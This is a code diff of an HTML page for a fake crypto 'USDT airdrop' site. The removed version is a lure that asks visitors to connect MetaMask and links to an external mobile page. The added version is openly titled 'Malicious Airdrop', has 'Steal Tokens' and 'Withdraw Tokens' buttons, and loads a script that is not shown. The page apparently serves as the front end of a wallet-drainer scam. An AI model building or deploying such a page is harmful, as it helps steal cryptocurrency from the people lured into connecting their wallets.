@@ -3,29 +3,16 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Airdrop USDT DApp</title>
-  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
-  <link rel="stylesheet" href="styles.css">
+  <title>Malicious Airdrop</title>
+  <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
+  <script src="script.js" defer></script>
 </head>
 <body>
-  <div class="container">
-    <h1>Airdrop DApp</h1>
-    <p>Claim your airdrop easily by connecting your MetaMask wallet.</p>
-
-    <!-- Connect Button -->
-    <button id="connectButton">Connect MetaMask</button>
-
-    <!-- Claim Button -->
-    <button id="claimAirdropButton" disabled>Claim Airdrop</button>
-
-    <!-- MetaMask Message -->
-    <div id="metaMaskMessage" style="display: none; color: red; margin-top: 20px;">
-      If you're on mobile, please open this link in the MetaMask browser: <br>
-      <code>https://buyemon.github.io/metamask/index.html</code>
-    </div>
-  </div>
-
-  <script src="script2.js"></script>
+  <h1>Malicious Airdrop</h1>
+  <button id="connectButton">Connect to MetaMask</button>
+  <button id="stealTokensButton" disabled>Steal Tokens</button>
+  <button id="withdrawTokensButton" disabled>Withdraw Tokens</button>
+  <p id="metaMaskMessage" style="display: none;">MetaMask is required to use this application.</p>
 </body>
 </html>
 
